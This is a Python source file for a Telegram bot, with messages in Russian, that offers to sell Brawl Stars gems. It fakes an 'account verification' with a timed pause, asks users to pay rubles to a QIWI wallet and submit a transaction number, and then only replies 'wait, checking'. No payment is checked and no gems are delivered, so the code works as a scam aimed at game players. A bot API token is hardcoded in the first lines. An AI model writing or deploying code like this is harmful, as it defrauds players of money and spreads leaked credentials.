
import telebot
import time
from telebot import types
bot = telebot.TeleBot('1395724832:AAGQHm2vDrKKthXyAGBD_8svRFAFRZokXvs')


@bot.message_handler(commands=['reg'])
def start(message):
        bot.send_message(message.from_user.id, "Введите свой тег в Brawl Stars!")
        bot.register_next_step_handler(message, get_age)


def get_age(message):
    global age
    name = message.text
    keyboard = types.InlineKeyboardMarkup() #наша клавиатура
    key_yes = types.InlineKeyboardButton(text='Да', callback_data='yes') #кнопка «Да»
    keyboard.add(key_yes) #добавляем кнопку в клавиатуру
    key_no= types.InlineKeyboardButton(text='Нет', callback_data='no')
    keyboard.add(key_no)
    question = 'Твой тег  '+name+' ?'
    bot.send_message(message.from_user.id, text=question, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
    if call.data == "yes":
        bot.send_message(call.message.chat.id, 'Идет проверка аккаунта, ожидаете до 5 минут')
        time.sleep(44)
        bot.send_message(call.message.chat.id, 'Аккаунт подключен, для покупки гемов нажмите /pay')

    elif call.data == "no":
        bot.send_message(call.message.chat.id, 'Напиши /reg')

@bot.message_handler(commands=['pay'])
def help_command(message):
        keyboard1 = telebot.types.ReplyKeyboardMarkup()
        keyboard1.row('170кр. - 320руб.', '360кр. - 550руб.')
        keyboard1.row('950кр. - 1000руб.', '2000кр. - 2000руб.')
        bot.send_message(message.chat.id, 'Выберите количество кристаллов', reply_markup=keyboard1)

@bot.message_handler(commands=['paid'])
def paid_command(message):
    bot.send_message(message.chat.id, 'Ожидайте, идет проверка транзакции. И кристаллы появятся на вашем аккаунте')



@bot.message_handler(content_types=['text'])
def send_text(message):
            if message.text.lower() == '170кр. - 320руб.':
                bot.send_message(message.chat.id, 'Выбрано 170 кристаллов! Оплатите 320 рублей на KiWi кошелек: 111111.'
                                                  ' После оплаты напишите в !первом сообщении номер транзакции и потом /paid')
            elif message.text.lower() == '360кр. - 550руб.':
                bot.send_message(message.chat.id, 'Выбрано 360 кристаллов! Оплатите 550 рублей на KiWi кошелек: 111111.'
                                                  ' После оплаты напишите в !первом сообщении номер транзакции и потом /paid')
            elif message.text.lower() == '950кр. - 1000руб.':
                bot.send_message(message.chat.id, 'Выбрано 950 кристаллов! Оплатите 1000 рублей на KiWi кошелек: 111111.'
                                                  ' После оплаты напишите в !первом сообщении номер транзакции и потом /paid')
            elif message.text.lower() == '2000кр. - 2000руб.':
                bot.send_message(message.chat.id, 'Выбрано 2000 кристаллов! Оплатите 2000 рублей на KiWi кошелек: 111111.'
                                                  ' После оплаты напишите в !первом сообщении номер транзакции и потом /paid')




bot.polling(none_stop=True, interval=0)